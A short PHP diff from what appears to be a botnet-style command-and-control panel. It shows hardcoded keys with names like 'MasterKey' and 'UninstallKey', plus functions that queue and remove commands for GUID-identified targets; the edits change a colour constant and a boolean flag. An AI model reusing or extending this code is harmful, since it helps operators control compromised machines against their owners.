@@ -1,7 +1,7 @@
 <?php
 
 define('SALT', 'S4ltk33p3r');
-define('ColorVar', 5);
+define('ColorVar', 6);
 define('UninstallKey', strtoupper(hash('sha256', 'DestroyThemAll')));
 define('MasterKey', strtoupper(hash('sha256', 'PlagueToAll')));
 define('ObserverKey', strtoupper(hash('sha256', 'KnightOfEvil')));
@@ -197,7 +197,7 @@ function QueueCommandEx($_Target, $Command, $Params){
 function RemoveCommand($_GUID, $ID){
 	LogStr("Completed [$ID] -->\t$_GUID");
 	global $Conn;
-	$Cmds = parse_ini_string(GetCommands($_GUID, false), true);
+	$Cmds = parse_ini_string(GetCommands($_GUID, true), true);
 	$Cmds["General"]["CommandCount"]--;
 	$Names = $Cmds["General"]["Commands"];
 	if(strpos(" " . $Names, $ID)){
